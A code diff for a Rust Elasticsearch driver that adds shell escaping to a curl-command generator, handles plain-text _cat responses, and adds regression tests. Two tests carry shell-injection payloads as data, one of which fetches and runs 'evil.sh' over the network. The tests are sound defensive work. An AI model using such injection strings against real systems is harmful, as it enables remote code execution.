@@ -33,16 +33,26 @@ pub fn parse_query(query: &str) -> Option<(String, String, Option<String>)> {
     Some((method, path, body))
 }
 
+/// Escapes a string for safe interpolation inside a *single-quoted* shell
+/// argument, using the standard close-quote / escaped-literal-quote /
+/// reopen-quote technique: every `'` becomes `'\''`. Nothing else is special
+/// inside single quotes, so this is sufficient on its own.
+fn shell_escape_single_quoted(s: &str) -> String {
+    s.replace('\'', r"'\''")
+}
+
 pub fn to_curl(base_url: &str, query: &str) -> Option<String> {
     let (method, path, body) = parse_query(query)?;
     let base_url = base_url.trim_end_matches('/');
     let url = format!("{base_url}/{}", path.trim_start_matches('/'));
+    let url = shell_escape_single_quoted(&url);
     let method = method.to_uppercase();
     Some(match body {
-        Some(body) => format!(
-            "curl -X {method} \"{url}\" -H 'Content-Type: application/json' -d '{body}'"
-        ),
-        None => format!("curl -X {method} \"{url}\""),
+        Some(body) => {
+            let body = shell_escape_single_quoted(&body);
+            format!("curl -X {method} '{url}' -H 'Content-Type: application/json' -d '{body}'")
+        }
+        None => format!("curl -X {method} '{url}'"),
     })
 }
 
@@ -83,7 +93,12 @@ impl Driver for ElasticsearchDriver {
             request = request.header("Content-Type", "application/json").body(body.clone());
         }
         let response = request.send().await?;
-        let json: serde_json::Value = response.json().await?;
+        // Most Elasticsearch APIs return JSON, but the `_cat` family (e.g.
+        // `GET _cat/indices?v`) returns `text/plain` unless `format=json` is
+        // passed. Read the body as text first and fall back to wrapping it
+        // as a JSON string rather than erroring on a decode failure.
+        let text = response.text().await?;
+        let json = serde_json::from_str(&text).unwrap_or(serde_json::Value::String(text));
         Ok(QueryResult::Documents(vec![json]))
     }
 }
@@ -148,6 +163,29 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn execute_handles_the_cat_indices_plain_text_response() {
+        let container = ElasticSearch::default().start().await.unwrap();
+        let port = container.get_host_port_ipv4(9200).await.unwrap();
+        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
+        driver.connect().await.unwrap();
+
+        let result = driver.execute("GET _cat/indices?v").await;
+
+        let result = result.unwrap_or_else(|e| panic!("expected Ok, got error: {e:?}"));
+        match result {
+            QueryResult::Documents(docs) => {
+                assert_eq!(docs.len(), 1);
+                assert!(docs[0].is_string(), "expected a plain-text string, got: {docs:?}");
+                assert!(
+                    docs[0].as_str().unwrap().contains("health"),
+                    "expected the _cat/indices header row, got: {docs:?}"
+                );
+            }
+            QueryResult::Table { .. } => panic!("expected Documents"),
+        }
+    }
+
+    #[tokio::test]
     async fn list_schema_returns_created_indices() {
         let container = ElasticSearch::default().start().await.unwrap();
         let port = container.get_host_port_ipv4(9200).await.unwrap();
@@ -179,7 +217,7 @@ mod tests {
 
         assert_eq!(
             curl,
-            "curl -X POST \"http://localhost:9200/my-index/_search\" -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
+            "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
         );
     }
 
@@ -187,11 +225,52 @@ mod tests {
     fn to_curl_omits_the_body_flags_when_there_is_no_body() {
         let curl = to_curl("http://localhost:9200", "GET _cat/indices?v").unwrap();
 
-        assert_eq!(curl, "curl -X GET \"http://localhost:9200/_cat/indices?v\"");
+        assert_eq!(curl, "curl -X GET 'http://localhost:9200/_cat/indices?v'");
     }
 
     #[test]
     fn to_curl_returns_none_for_unparseable_queries() {
         assert!(to_curl("http://localhost:9200", "").is_none());
+    }
+
+    #[test]
+    fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
+        let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
+        let curl = to_curl("http://localhost:9200", &format!("POST my-index/_search\n{body}")).unwrap();
+
+        // Every `'` in the body must be replaced with the close-quote /
+        // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
+        // stays a single shell argument with no early quote-close.
+        let expected_escaped_body = r#"{"query": "'\''; curl evil.sh | sh; '\''"}"#;
+        assert_eq!(
+            curl,
+            format!(
+                "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{expected_escaped_body}'"
+            )
+        );
+    }
+
+    #[test]
+    fn to_curl_escaped_body_round_trips_through_a_real_shell() {
+        let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
+        let curl = to_curl("http://localhost:9200", &format!("POST my-index/_search\n{body}")).unwrap();
+
+        // Run the generated command through a real shell, replacing `curl`
+        // with `echo` so nothing actually hits the network, and assert the
+        // shell reconstructs exactly the original (unescaped) body as a
+        // single argument — proving the embedded `'; ...; '` never breaks
+        // out of the quoted string.
+        let script = curl.replacen("curl", "echo", 1);
+        let output = std::process::Command::new("sh").arg("-c").arg(&script).output().unwrap();
+        let stdout = String::from_utf8_lossy(&output.stdout);
+
+        assert!(
+            !std::path::Path::new("/tmp/tradar-to-curl-test-should-not-exist").exists(),
+            "the injected `touch` command ran — to_curl produced unsafe shell output: {curl}"
+        );
+        assert!(
+            stdout.contains(body),
+            "expected the shell-parsed output to contain the original body verbatim, got: {stdout}"
+        );
     }
 }
